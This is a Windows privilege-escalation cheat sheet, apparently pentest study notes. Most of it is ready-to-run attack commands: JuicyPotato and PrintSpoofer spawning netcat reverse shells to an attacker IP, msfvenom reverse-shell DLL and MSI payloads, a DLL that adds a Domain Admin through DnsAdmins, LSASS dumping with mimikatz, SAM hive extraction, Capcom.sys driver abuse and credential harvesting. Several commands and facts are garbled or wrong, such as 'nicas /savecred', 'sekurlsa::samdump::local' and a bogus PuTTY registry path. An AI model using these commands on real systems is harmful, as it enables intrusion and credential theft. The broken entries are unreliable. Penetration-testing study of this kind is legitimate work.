# WINDOWS PRIVILEGE ESCALATION
## Gathering Information of the System
### 1.Network & System Information
**Network Configuration:**
`ipconfig /all` → View detailed network interface configurations (IP, DNS, etc.).
`arp -a` → Display ARP cache (shows local network devices).
`route print` → View the system's routing table.

**Service Information:**
`tasklist /svc` → List all running processes along with their services.
`netstat -ano` → Display active TCP/UDP connections and listening ports with process IDs.

**System Info:**
`systeminfo` → Get a comprehensive overview of the system (OS version, architecture, hotfixes, etc.).
`wmic product get name` → List installed software via the command line.
`Get-WmiObject -Class Win32_Product | select Name, Version` → List installed software via PowerShell.

### 2.User & Privilege Enumeration
**Current User & Privileges:**
`whoami /priv` → List current user privileges.

`whoami /groups` → List group memberships for the current user.

`net user` → Get a list of all user accounts.

`query user` → Display logged-in users on the system.

**Groups & Password Policies:**

`net localgroup` → List all local groups.

`net localgroup "Backup Operators"` → List users in the Backup Operators group.

`net accounts` → View password policies and other account-related configurations.

### 3.Security Tools & Configuration
**Windows Defender:**

`Get-MpComputerStatus` → Check the status of Windows Defender (active, signatures, etc.).

**AppLocker:**

`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` → List effective AppLocker rules.

`Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone` → Test if a specific executable (cmd.exe) can be run for a specific user.

### 4.Named Pipes & Permission Enumeration

**Listing Named Pipes:**

`pipelist.exe /accepteula` → List all named pipes on the system.

**Access Rights to Named Pipes:**

`accesschk.exe /accepteula \\.\Pipe\lsass -v` → Check permissions for a specific named pipe (e.g., LSASS pipe).

`accesschk.exe /accepteula -w \\.\Pipe\SQLLocal\SQLEXPRESS01 -v` → Check write access for a SQL pipe.

### 5.Environment Variables & Other Useful Commands

**View Environment Variables:**

`set` → Display environment variables for the current session.


## User Privileges
### Basic Privilege Enumeration
**Check current user privileges:**
`whoami /priv` → Lists all privileges assigned to the current user. This is crucial for identifying rights that could lead to privilege escalation (e.g., SeBackupPrivilege, SeImpersonatePrivilege).

**Common Privileges to Look for:**
`SeBackupPrivilege` → Allows the user to bypass file security to perform backups.

`SeRestorePrivilege` → Allows the user to overwrite system files, useful for file replacement attacks.

`SeTakeOwnershipPrivilege` → Allows taking ownership of any object, which can lead to control over important files or processes.

`SeImpersonatePrivilege` → Allows impersonation of a token, often leading to privilege escalation (common in token impersonation attacks).

`SeDebugPrivilege` → Allows debugging processes, typically restricted to admins. Can be used to inject code into privileged processes.


## SeImpersonatePrivilege and SeAssignPrimaryToken
### Privilege Escalation via SeImpersonatePrivilege and SeAssignPrimaryToken
**Understanding SeImpersonatePrivilege**
**SeImpersonatePrivilege** is a Windows security setting granted by default to the local Administrators group and the Local Service account. It allows certain programs to impersonate users or specified accounts, enabling the program to execute tasks on behalf of those users.

**Key Command:**

`whoami /priv` → If this command shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, you can exploit it to impersonate a privileged account, such as `NT AUTHORITY\SYSTEM`.

### Exploiting SeImpersonatePrivilege
Several tools and techniques exploit SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege to escalate privileges to SYSTEM or Administrator. Here are two primary tools:

#### 1.JuicyPotato Exploit
**JuicyPotato** is an exploit tool that abuses SeImpersonate or SeAssignPrimaryToken privileges via `DCOM/NTLM` reflection attacks. It works on Windows versions up to Server 2016 and Windows 10 build 1809 (it does not work on Server 2019 or newer Windows 10 versions).

**Steps to Exploit Using JuicyPotato:**

1.Set up a Netcat listener on your attacking machine:
```bash!
nc -lnvp 8443
```
2.Run JuicyPotato on the target:
```bash!
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
**Explanation:**

`-l` → Specifies the COM server listening port (53375 in this case).

`-p` → Program to launch (in this case, cmd.exe).

`-a` → Argument passed to cmd.exe. Here, it instructs Netcat to connect to the attacker's machine and provide a reverse shell.

`-t` → Specifies the createprocess call, using either CreateProcessWithTokenW or CreateProcessAsUser functions, which require SeImpersonate or SeAssignPrimaryToken privileges.


#### 2.PrintSpoofer and RoguePotato
On newer versions of Windows where JuicyPotato doesn't work (Windows 10 build 1809 and beyond, and Server 2019), tools like **PrintSpoofer** and **RoguePotato** can be used to exploit **SeImpersonatePrivilege**.

**PrintSpoofer:**

PrintSpoofer is a tool that abuses the SeImpersonatePrivilege through the print spooler service to escalate to `SYSTEM`.

**Steps to Exploit Using PrintSpoofer:**
1.Run PrintSpoofer:
```bash!
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
**Explanation:**

`-c` → Specifies the command to execute once the privilege escalation is successful. In this case, it is running Netcat (nc.exe) to provide a reverse shell to the attacker's machine.

#### Note:
JuicyPotato is effective on older Windows versions (Windows Server 2016 and below), but it no longer works on Windows Server 2019 and Windows 10 build 1809 onwards.

For newer systems, alternatives like RoguePotato or PrintSpoofer are more appropriate for exploiting SeImpersonatePrivilege.


## SeDebugPrivilege
**SeDebugPrivilege** is a powerful Windows privilege that allows a user to debug and interact with any process running on the system, even those running as SYSTEM. This privilege is primarily intended for developers and administrators to debug applications but can be exploited to escalate privileges.

**Key Command:**
`whoami /priv` → Check if the current user has SeDebugPrivilege. If listed, this privilege can be abused to access sensitive system processes like LSASS or escalate privileges by injecting malicious code into these processes.

### Exploiting SeDebugPrivilege
If a user has SeDebugPrivilege, they can exploit it to interact with high-privileged processes, especially those running as SYSTEM. By accessing these processes, an attacker can extract sensitive information, such as credentials or passwords, or gain full control over the system.

**Here are the main methods for exploiting SeDebugPrivilege:**

#### 1.Dumping LSASS to Extract Credentials
**The Local Security Authority Subsystem Service (LSASS)** is responsible for enforcing the security policy on the system, handling password changes, and validating users for login. LSASS holds credentials in memory, and if SeDebugPrivilege is enabled, it can be dumped to extract these credentials.

**Steps to Exploit LSASS Dumping:**
#### 1.Use ProcDump:
```bash!
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
**Explanation:**

`-ma` → Captures a full memory dump of the lsass.exe process.

`lsass.dmp` → The output dump file that can later be analyzed to extract credentials.

#### 2.Analyze the dump with Mimikatz:
```bash!
arduinoCopy codemimikatz.exe
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
**Explanation:**
`sekurlsa::minidump` → Loads the dumped file.

`sekurlsa::logonpasswords` → Extracts credentials from the dump.

### 2.Exploiting SeDebugPrivilege for RCE as SYSTEM
The **SeDebugPrivilege** can be used to gain Remote Code Execution (RCE) as `SYSTEM` by manipulating processes and inheriting elevated tokens from a SYSTEM-level process. The basic idea is to launch a child process that inherits the token of the parent process, which is running with `SYSTEM` privileges. By leveraging SeDebugPrivilege, we can alter the system's normal behavior and execute commands with SYSTEM rights.

#### Steps to Achieve RCE as SYSTEM Using SeDebugPrivilege
1.**Identify a SYSTEM-level process:**
First, we need to identify a process that is running with `SYSTEM` privileges. We can do this using the tasklist command in an elevated PowerShell session.

Command:
```bash!
PS C:\> tasklist
```
This will give you a list of running processes along with their PID (Process IDs). Locate the PID of a process running as SYSTEM.

2.**Using psgetsystem Tool:**
We will now use the psgetsystem tool, which can be found at https://github.com/decoder-it/psgetsystem, to impersonate the SYSTEM privileges of the identified parent process and launch a command as SYSTEM.

**Steps to Use psgetsystem:**

i.**Download and Import the Script:**

After downloading the `psgetsys.ps1` script from the repository, import it into your PowerShell session:

Command:
```bash!
PS> . .\psgetsys.ps1
```
ii.**Impersonate SYSTEM Using Parent Process ID (PPID):**

Now, use the ImpersonateFromParentPid function to impersonate `SYSTEM` by specifying the Parent Process ID (`ppid`) of the SYSTEM-level process you found earlier. You can then execute any command as SYSTEM.

Command:
```bash!
PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```
For example, to launch `cmd.exe` as SYSTEM, you would run the following:
```bash!
ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe" -cmdargs ""
```


`-ppid` → Specifies the Parent Process ID (the SYSTEM process ID obtained earlier).

`-command` → The command to be executed (in this case, cmd.exe).

`-cmdargs` → Any additional command arguments (optional).


## SeTakeOwnershipPrivilege
**SeTakeOwnershipPrivilege** is a Windows privilege that allows users to take ownership of objects, such as files, folders, or registry keys, even if they do not have explicit permissions to do so. Once ownership is taken, the user can modify the object's permissions to grant themselves full control, effectively bypassing access restrictions.

**Key Command:**

`whoami /priv` → Use this command to check if SeTakeOwnershipPrivilege is enabled for your user account.

### Exploiting SeTakeOwnershipPrivilege
If a user has SeTakeOwnershipPrivilege, they can take control of sensitive objects like system files or critical processes and modify their permissions to gain access or execute arbitrary commands. Here's how you can exploit this privilege to escalate your privileges:
```bash!
PS C:\ptd> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
```
If privilege is disabled, we can enable it using this script ;
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```bash!
PS C:\> Import-Module .\Enable-Privilege.ps1
PS C:\> .\EnableAllTokenPrivs.ps1
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

### 1.Taking Ownership of Files or Directories
**SeTakeOwnershipPrivilege** allows you to change ownership of a file or folder, giving you the ability to modify or access restricted files. After taking ownership, you can change its Discretionary Access Control List (DACL) to grant yourself full control.

**Steps to Exploit SeTakeOwnershipPrivilege on Files:**

Take Ownership of a File or Directory:

Use the `takeown` command to take ownership of a file or directory.

Command:
```bash!
takeown /F <file_or_folder_path>
```
Example:
```bash!
takeown /F C:\Windows\System32\drivers\etc\hosts
```
This command changes the ownership of the specified file to your user account.


### 2.Grant Yourself Full Control Over the Files
After taking ownership, modify the file's permissions using the `icacls` command to give yourself full control.

Command:
```bash!
icacls <file_or_folder_path> /grant <username>:F
```
Example:
```bash!
icacls C:\Windows\System32\drivers\etc\hosts /grant <username>:F
```

`/grant` → Grants full control (F) over the file to the specified user.

### 3.Modify or Access the File:
After granting yourself full control, you can now edit, delete, or access the file as needed. For example, you can now modify sensitive system files like `hosts`, or even replace system executables with malicious ones to gain SYSTEM-level privileges.


### 2.Taking Ownership of Registry Keys
You can also use `SeTakeOwnershipPrivilege` to modify ownership and permissions of critical registry keys, which may allow you to escalate privileges.

**Steps to Exploit Registry Keys:**

1.**Take Ownership of a Registry Key:**

Use `regedit` or `PowerShell` to change the ownership of a registry key. You can take ownership of sensitive keys such as those related to user accounts, services, or startup configurations.

Example in PowerShell:
```bash!
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "<key>" -Value "<value>"
```
This changes the ownership of the key, allowing you to modify startup settings or other critical configurations.


2.**Modify Permissions:**
After taking ownership, modify the permissions to grant yourself full control. You can now alter the key's values to execute malicious code, start services with SYSTEM privileges, or add new startup entries.


## Group Privileges
Windows groups are collections of user accounts that share the same security permissions and rights. Each group has specific privileges that determine what actions members of that group can perform on a system. Some groups have extensive privileges that can be leveraged for privilege escalation.

Understanding group privileges is crucial for enumerating potential attack vectors in privilege escalation scenarios. Some groups, like Administrators, Backup Operators, and Remote Desktop Users, can provide direct or indirect paths to gaining SYSTEM or administrative privileges.

### Common Privileged Groups in Windows
1.**Administrators Group**
The Administrators group has the highest level of access on a Windows machine, including full control over all system files, settings, and user accounts.
**Members of this group can:**
Execute any command with `SYSTEM` privileges.

Install and modify software, hardware drivers, and security settings.

Manage user accounts and change passwords.

Take ownership of files and directories.

**Key Commands:**
`net localgroup administrators` → List all members of the Administrators group.

**Privilege Escalation Path:**
If you can add yourself to the Administrators group or impersonate a member, you can gain full control of the system.

2.**Backup Operators Group**
The **Backup Operators group** has special privileges that allow members to back up and restore files, even if they don't have explicit permissions to access those files.
**Members of this group can:**
Bypass NTFS permissions and access files for backup and restoration.

Backup files from any directory.

Restore files to any directory.

Log on locally to a machine.

**Key Commands:**
`net localgroup "Backup Operators"` → List all members of the Backup Operators group.

**Privilege Escalation Path:**
Backup Operators can read or overwrite sensitive files, including the SAM (Security Account Manager) database, which stores user password hashes. By extracting hashes, they can perform pass-the-hash attacks or crack the hashes to gain higher-level access.

3.**Remote Desktop Users Group**
The Remote Desktop Users group grants the ability to log in to a system via Remote Desktop Protocol (RDP). While not a highly privileged group, remote access can facilitate further exploitation, such as:

Running commands remotely.

Enumerating the system and potentially exploiting local vulnerabilities to escalate privileges.

**Key Commands:**

`net localgroup "Remote Desktop Users"` → List all members of the Remote Desktop Users group.

**Privilege Escalation Path:**
Remote Desktop Users can connect to the system via RDP, and if they can exploit a local privilege escalation vulnerability (such as SeImpersonatePrivilege), they can elevate to SYSTEM or Administrator.


4. **Power Users Group**
In earlier versions of Windows (pre-Windows Vista), the Power Users group had elevated privileges similar to the Administrators group. However, in modern versions of Windows, the Power Users group has significantly reduced capabilities.
**Members of this group can:**
Install programs.

Modify system settings to a limited extent.

Manage some services and user accounts.

**Key Commands:**
`net localgroup "Power Users"` → List all members of the Power Users group.

**Privilege Escalation Path:**
While this group has been deprecated, on older systems or misconfigured environments, being a member of this group may still provide a path for privilege escalation by installing malicious software or exploiting vulnerable system configurations.

5.**Users Group**
The Users group contains standard user accounts with limited privileges. **Members can:**
Access their own files and certain shared system resources.

Run applications that do not require elevated privileges.

Access shared folders if permissions allow.

**Key Commands:**
`net localgroup users` → List all members of the Users group.

**Privilege Escalation Path:**
Users in this group typically do not have elevated privileges, but privilege escalation is possible if there are misconfigurations or vulnerable software that can be exploited to gain administrative rights.

6.**Guests Group**
The Guests group is designed for temporary users with minimal permissions. **Members can:**
Log on with a temporary profile.

Access basic resources on the system.

**Key Commands:**
`net localgroup guests` → List all members of the Guests group.

**Privilege Escalation Path:**
Members of this group have very limited rights, but if they can exploit a vulnerability (such as a privilege escalation bug or improperly configured permissions), they may be able to escalate to a more privileged account.

### Other Special Groups
7.**Distributed COM Users Group**
Members of this group can launch, activate, and use Distributed Component Object Model (DCOM) objects remotely. While not immediately powerful, if DCOM is misconfigured, it can be used in DCOM/NTLM reflection attacks for privilege escalation.

**Key Commands:**

`net localgroup "Distributed COM Users"` → List all members of the Distributed COM Users group.

8.**Hyper-V Administrators Group**
Members of this group have administrative privileges to manage Hyper-V virtual machines (VMs). **They can:**
Control virtual machine configurations.

Start or stop VMs.

Access virtual hard drives (VHDs) containing sensitive data.

**Key Commands:**
`net localgroup "Hyper-V Administrators"` → List all members of the Hyper-V Administrators group.


### Enumeration of Group Privileges
Enumerating group memberships and privileges is crucial for assessing the attack surface in a Windows environment.

**Useful Commands for Enumeration:**
List All Users in a Group:
```bash!
net localgroup <groupname>
```
List All Groups:
```bash!
net localgroup
```
Check User Group Membership:
```bash!
whoami /groups
```

Check Privileges of the Current User:
```bash!
whoami /priv
```

## Backup Operators
The Backup Operators group is a built-in group in Windows that grants members the ability to back up and restore files, even if they do not have permission to access the files under normal circumstances. This privilege makes the group particularly powerful for potential abuse in privilege escalation scenarios, as Backup Operators can access sensitive files like the SAM (Security Account Manager) database and system files, which can lead to gaining higher-level access or even SYSTEM privileges.

### Key Privileges of Backup Operators
Members of the Backup Operators group have two key privileges:

1.**SeBackupPrivilege:**
Allows users to bypass file system permissions to back up files. This means a Backup Operator can read files that they normally do not have permissions to access.

2.**SeRestorePrivilege:**
Allows users to restore files to any location on the file system, including protected or sensitive locations. This also allows modifying files that would otherwise be restricted.

### Exploiting the Backup Operators Group for Privilege Escalation
#### Backup and Extract the SAM Database
One of the primary ways to exploit Backup Operators is by accessing and extracting the SAM (Security Account Manager) database. The SAM database contains password hashes for local user accounts, including Administrator and SYSTEM.

**Steps to Exploit:**
1.Backup the SAM, SYSTEM, and SECURITY Hives:
Use the `reg save` command to back up these registry hives, which contain critical security information (including password hashes).
```bash!
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system
reg save hklm\security c:\temp\security
```
The reg save command can be used because Backup Operators have the privilege to read files they normally wouldn't have access to.


2.**Extract Password Hashes Using Tools:**
Once you've backed up the hives, you can copy them to your attacker machine and use tools like mimikatz or John the Ripper to extract password hashes from the SAM and crack them.

Example using mimikatz:
```bash!
sekurlsa::samdump::local c:\temp\sam c:\temp\system
```
or from linux

Using `secretsdump.py:`
```bash!
dreamy@fsociety$ secretsdump.py -ntds ntds.dit -system system.back LOCAL
```

3.**Crack the Hashes or Use Pass-the-Hash:**
If the hashes are crackable, you can attempt to crack them and log in with a privileged account. Alternatively, you can use the pass-the-hash technique to impersonate a privileged user (e.g., `Administrator`) without knowing the password.

## DnsAdmins
Members of the https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins group possess access to DNS information on the network, which can be exploited for privilege escalation. By leveraging this group’s permissions, we can create a malicious DLL that adds a user to the Domain Admins group or provides a reverse shell.

### Generating Malicious DLLs with msfvenom
#### 1.Creating a DLL to Add a User to the Domain Admins Group: 
To create a DLL that executes a command to add a user to the Domain Admins group, use the following command:
```bash!
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" netadm /add /domain' -f dll -o adduser.dll
```

#### 2.Creating a DLL for a Reverse Shell: 
To generate a DLL that provides a reverse shell, use the following command:
```bash!
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.18 LPORT=5555 -f dll > dbs.dll
```
This command creates a DLL named dbs.dll that will establish a reverse shell connection back to the attacker's machine.

### Loading the DLL into the DNS Service
After generating the desired DLL, transfer it to the target machine. Next, load the DLL into the DNS service by executing the following command:
```bash!
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
This command configures the DNS server to load the `adduser.dll` the next time the service starts.

### Starting the DNS Service
To execute the DLL, the DNS service needs to be restarted. Run the following commands:
```bash!
sc.exe stop dns
sc.exe start dns
```
If you lack the necessary permissions to start or stop the DNS service, you may need to wait until the service is restarted naturally, which could occur due to maintenance or other scheduled tasks.

### Verification
To confirm that the user has been successfully added to the Domain Admins group, execute the following command:
```bash!
net group "Domain Admins" /dom
```
This command will display the members of the Domain Admins group, allowing you to verify that the new user (`netadm`) has been added successfully.



## Server Operators
The Server Operators group is a built-in security group in Windows Server environments. Members of this group are granted specific administrative privileges that allow them to perform server-related tasks without having full administrative rights. This group is primarily designed for delegated server management.

### Key Privileges of Server Operators
Members of the Server Operators group have the following privileges:

#### 1.Start and Stop Services:

They can start, stop, and pause services on the server, which is crucial for server maintenance and troubleshooting.

#### 2.Manage Shared Resources:

Server Operators can create, modify, and delete shared folders and manage printer shares, allowing them to administer shared resources effectively.

#### 3.Backup and Restore Operations:

Members can back up files and restore files from backup, making it easier to manage data recovery processes.

#### 4.Log on Locally:

Members have the ability to log on locally to the server, which allows them to directly manage the server through its console.

#### 5.Manage Local Users and Groups:

They can add or remove users from local groups and manage local accounts, which is important for user management tasks.

### Limitations
While the Server Operators group has significant privileges, it does not have the same level of access as the Domain Admins group. Notably, Server Operators cannot:

**Manage Active Directory**: They do not have permissions to modify Active Directory objects or group memberships outside of local server settings.

**Modify System Settings**: Critical system configurations that affect the entire domain or security policies are beyond their reach.


## Always Install Elevated
The Always Install Elevated policy is a setting in Windows that allows standard users to install applications with elevated privileges. When this policy is enabled, any application installation initiated by a standard user can run with administrative rights, effectively bypassing User Account Control (UAC) prompts.

### How It Works
When the Always Install Elevated setting is enabled, the following occurs:

#### 1.Elevation of Installations: 
Standard users can install applications without being prompted for administrator credentials. This means that any MSI (Microsoft Installer) package executed will run with elevated permissions.

#### 2.UAC Bypass: 
Users do not see the standard UAC prompt, which can prevent them from being aware of the risks associated with the installation of potentially harmful software.

### Creating and Executing a Malicious MSI Package for Reverse Shell Access

#### 1.Generate the Malicious MSI Package:

Use `msfvenom` to create a malicious MSI file that will initiate a reverse shell connection back to your listener. In this example, the local host (LHOST) is set to `10.10.10.12`, and the local port (LPORT) is set to `4444`.

The command to generate the MSI package is as follows:
```bash!
dreamy@fsociety$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.12 lport=4444 -f msi > dbs.msi
```
#### 2.Transfer the MSI File:

After generating the `dbs.msi` file, transfer it to the target machine where you want to execute it.


#### 3.Set Up a Netcat Listener:

On your attacking machine, set up a netcat listener to catch the reverse shell once the MSI package is executed:
```bash!
nc -lnvp 4444
```
#### 4.Execute the MSI Package:

On the target machine, run the following command to execute the malicious MSI package quietly, without displaying any prompts or restarting the system:
```bash!
C:\> msiexec /i c:\users\dreamy\desktop\dbs.msi /quiet /qn /norestart
```

After executing this command, the target machine will connect back to your listener, providing you with a reverse shell with system privileges.


## Print Operators
The **Print Operators** group in Windows is designed for users who need the ability to manage printers and print jobs. Members of this group can perform tasks like configuring printers, managing print queues, and performing print server tasks. While these permissions are focused on printing functionalities, they can potentially be exploited for privilege escalation on a Windows system.

### Privilege Escalation via Print Operators Group and Capcom.sys Driver
The Print Operators group is a highly privileged group in Windows that grants its members several significant permissions, including:

`SeLoadDriverPrivilege`: Allows members to load and manage system drivers.

The ability to manage, create, share, and delete printers connected to a Domain Controller.

The ability to log on locally to a Domain Controller and shut it down.

Given these privileges, members of this group can load system drivers, enabling them to exploit the system further.

### Using Capcom.sys for Privilege Escalation
The Capcom.sys driver is a well-known driver that allows users to execute shell code with system privileges. This driver can be particularly useful for escalating privileges in a Windows environment.

#### 1.Download the Capcom.sys Driver:

The `Capcom.sys` driver can be downloaded from the following GitHub repository:
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
Additionally, you can find useful tools such as `LoadDriver.exe` and ExploitCapcom.exe in the following repository:
https://github.com/JoshMorrison99/SeLoadDriverPrivilege

#### 2.Create a Malicious Executable:

Using Metasploit, create a malicious executable (e.g., `rev.exe`) that will provide a reverse shell when executed. This executable will be run with elevated privileges after loading the Capcom.sys driver.


#### 3.Load the Capcom.sys Driver:

Use the `LoadDriver.exe` tool to load the Capcom.sys driver. The command syntax is as follows:
```bash!
.\LoadDriver.exe System\CurrentControlSet\MyService C:\Users\Bailey\Capcom.sys
```


Upon successful execution, this command should return `NTSTATUS: 00000000, WinError: 0`. If it does not, check the location of `Capcom.sys` or ensure that you are executing `LoadDriver.exe` from the correct directory.

#### 4.Execute the Malicious Executable:

After successfully loading the driver, use `ExploitCapcom.exe` to execute your malicious executable with elevated privileges:
```bash!
.\ExploitCapcom.exe C:\Windows\Place\to\reverseshell\rev.exe
```

This command runs the `rev.exe` file with system privileges, providing the attacker with a reverse shell.

### Conclusion
By leveraging the permissions granted to members of the Print Operators group, especially the ability to load drivers, an attacker can use the Capcom.sys driver to execute malicious code with system privileges. Understanding these techniques is crucial for securing Windows environments and preventing unauthorized access.


## Event Log Readers
The Event Log Readers group in Windows is designed to allow its members to read the event logs on a system. This group typically includes users who need to monitor or analyze system and application events without granting them broader administrative privileges.

### Privileges Granted
Members of the Event Log Readers group have the following privileges:

**Read Event Logs**: Users can access and read the event logs generated by the Windows operating system, applications, and services.

**View Security Logs**: This includes access to security-related events, which may contain sensitive information such as user logins, account changes, and security policy changes.

### Potential for Privilege Escalation
While the Event Log Readers group does not inherently grant high privileges, there are specific scenarios where these members could potentially escalate their privileges:
#### 1.Analyzing Security Logs:

By reviewing security logs, a user may identify sensitive information, such as account credentials, account lockouts, or changes made by other users. This information could potentially be leveraged to gain unauthorized access to accounts or systems.

#### 2.Identifying Vulnerabilities:

Users can analyze event logs to identify misconfigurations or vulnerabilities in the system. For example, if an administrator frequently logs in and out or if there are repeated failed login attempts, this could indicate weak passwords or poorly secured accounts.

#### 3.Targeting Other Users:

Information from event logs can help identify high-privilege accounts and their activity patterns. An attacker could use this information to craft targeted attacks, such as phishing or social engineering, against those users.

#### 4.Leveraging Log Access for Other Attacks:

If a user can read event logs, they may be able to manipulate logging services or other components to perform actions with higher privileges, especially if there are vulnerabilities or misconfigurations in those services.

### Searching Security Logs Using wevtutil
The `wevtutil` command-line utility is a powerful tool for managing Windows Event Logs. It can be used to query event logs and retrieve information based on specific criteria. In this example, we will focus on querying the Security log to find specific user-related events.
Example Command:
```bash!
PS C:\ptd> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

`Breakdown of the Command`:

`wevtutil`: This is the command-line utility for Windows Event Log management.

qe Security: This option specifies that we want to query the Security log.

`/rd:true`: This option reverses the order of the events, showing the most recent events first. This is useful for quickly identifying the latest activities.

`/f:text`: This option specifies the format of the output. In this case, we are requesting the output in plain text format.

`| Select-String "/user"`: This part of the command pipes the output to the `Select-String` cmdlet, which filters the results to only include lines that contain the string `/user`. This is particularly useful for identifying log entries related to user account actions.

**Sample Output**:

The command may produce output similar to the following:
```bash!
Process Command Line:   net use T: \\dbs\backups /user:dreamy Pass1234
```

**Interpretation of the Output**

The output indicates that a command was executed to establish a network connection to `\\dbs\backups` using the specified username (dreamy) and password (`Pass1234`).

This information can be crucial for security analysis, as it reveals user activity related to network shares, which could potentially indicate unauthorized access or misuse of credentials.

**Conclusion**
Using `wevtutil` to search through security logs can provide valuable insights into user activities and potential security incidents. The ability to filter results with `Select-String` allows for more focused analysis, making it easier to spot suspicious behavior or investigate incidents.


## Credential Theft
Credential hunting involves searching for sensitive information, such as usernames and passwords, within various files and system locations. Below are methods for locating credentials on Windows systems.

### Searching Security Logs Using wevtutil
You can query security logs for specific user actions, such as logins or credential usage:
```bash!
PS C:\dbs> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
**Example Output**:
```bash!
Process Command Line:   net use T: \\dbs\users /user:dreamy Pass1234
```
### Searching for Credentials in Files
**Using Command Prompt**
Search for specific terms like "password" in various file types:
```bash!
C:\dbs> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```


**Flags**:

`/S`: Search in the current directory and all subdirectories.

`/I`: Ignore case sensitivity.

`/M`: Output only filenames containing the search string.

#### Searching within a specific user directory:
```bash!
C:\dbs> findstr /S /I /C:"password" "C:\Users\*"*.txt *.ini *.cfg *.config *.xml
```

#### Manually searching a user's Documents folder:
```bash!
C:\dbs> cd C:\Users\dreamy\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

### Using PowerShell

To search through text files in the Documents folder:
```bash!
PS C:\dbs> select-string -Path C:\Users\dreamy\Documents\*.txt -Pattern password
```
To find files with "pass" in their names:
```bash!
C:\dbs> dir /S /B *pass*.txt, *pass*.xml, *pass*.ini, *cred*, *vnc*, *.config*
```

Searching recursively for configuration files:
```bash!
C:\dbs> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Further Credential Theft
#### Listing Stored Credentials
**To list stored usernames and passwords**:
```bash!
C:\dbs> cmdkey /list
```

**To run a command as another user and save credentials**:
```bash!
C:\dbs> nicas /savecred /user:marvel\sanga "COMMAND HERE"
```

### Browser Credentials
Use `SharpChrome` to retrieve cookies and saved logins from Google Chrome:
```bash!
PS C:\dbs> .\SharpChrome.exe logins /unprotect
```

Using Lazagne to retrieve credentials from various applications:
```bash!
PS C:\dbs> .\lazagne.exe all
```

Extracting saved credentials from various applications using `SessionGopher`:
```bash!
C:\dbs> Import-Module .\SessionGopher.ps1
C:\dbs> Invoke-SessionGopher -Target WIN01
```

### Windows AutoLogon
Windows AutoLogon allows a user to configure their system to automatically log into a specific account without entering credentials each time. The relevant registry keys can be found under `HKEY_LOCAL_MACHINE`:
```bash!
C:\dbs> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Example Output**:
```bash!
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    dreamy
DefaultPassword   REG_SZ    pass1234
```

### Clear-Text Password Storage in the Registry
#### PuTTY
Saved sessions for PuTTY can be found in the following registry location:
```bash!
Computer\HKEY_CURRENT_USER\SOFTWARE\ErlingHaaland\PuTTY\Sessions\<SESSION NAME>
```

#### Viewing Saved Wireless Networks
To view saved wireless network profiles:
```bash!
netsh wlan show profile
```

### PowerShell Credentials
PowerShell credentials can be stored and retrieved securely for scripting purposes. They are encrypted using **Data Protection API** (DPAPI) and can be decrypted only by the same user on the same computer.
Example Commands:
```bash!
C:\dbs> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
C:\dbs> $credential.GetNetworkCredential().username
dreamy
C:\dbs> $credential.GetNetworkCredential().password
pass1234
```

